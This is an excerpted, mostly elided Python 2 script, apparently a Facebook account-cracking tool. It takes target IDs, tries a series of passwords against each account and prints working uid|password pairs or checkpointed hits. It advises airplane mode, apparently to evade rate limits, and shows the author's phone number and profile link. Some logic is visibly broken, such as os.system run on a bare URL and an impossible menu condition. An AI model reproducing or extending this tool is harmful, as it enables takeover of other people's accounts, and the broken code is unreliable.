...
def main():
    ...
    print '\x1b[92;1m  [1] START CLONING'

    print '\x1b[93;1m  [2] HOW TO GET ACCESS TOKEN'

    print '\x1b[94;1m  [3] UPDATE TOOL'

    print '\x1b[96;1m  [F] MY FACEBOOK \https://www.facebook.com/profile.php?id=100076280059651'

    print '\x1b[92;1m  [W] MY WHATSAPP NO 03237528063\x1b[0m'
...
def log_sel():
    ...
    if sel == '':
        ...
        subprocess.check_output([
            ...
            'https://www.facebook.com/profile.php?id=100076280059651'])
        ...
        try:
            ...
            os.system('https://github.com/Ehsan1245/Ehsan.py.git')

            os.system('rm -rf Pro')

            os.system('cp -f Pro/Pro \\.')
    ...
    if sel == '4' and sel == '04' and sel == 'F' or sel == 'f':
        ...
        xox('\n\t\x1b[91;1m EHSAN IS ALWAYS KING:)')
...
def menu():
    ...
    print '\x1b[93;1 B WELCOME : \x1b[92;1m' + xn

    print '\x1b[93;1m  COUNTRY : \x1b[92;1m' + loc
...
def crack1():
    ...
    print '\x1b[93;1m  [2] CRACK OLD ID'
...
def crack_select1():
    ...
    if select == '1':
        ...
        try:
            ...
            id_limit = int(raw_input('\x1b[93;1m  ENTER LIMIT (\x1b[91;1m MAX [5]\x1b[93;1m): \x1b[92;1m'))
        ...
        for t in range(id_limit):
            ...
            idt = raw_input('\x1b[93;1m  INPUT FOLLOWER ID account (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)
    ...
    print '\x1b[92;1m  Ehsan3 HAS BEEN STARTED\x1b[0m'

    print '\x1b[92;1m  USE (Flight Mod) AIRPLANE MOD\x1b[0m'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ...
                            print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ...
                                print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ...
                                    print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        ...
                                        print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ...
                                        print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            ...
                                            print ' \x1b[1;32m[Ehsan3-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ...
                                            print ' \x1b[1;33m[Ehsan3-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
...
def crack():
    ...
    print '\x1b[92;1m  [3] CRACK FILE [USE AUTO PASS]'
...
def crack_select():
    ...
    print '\x1b[92;1m  Ehsan HAS BEEN STARTED\x1b[0m'
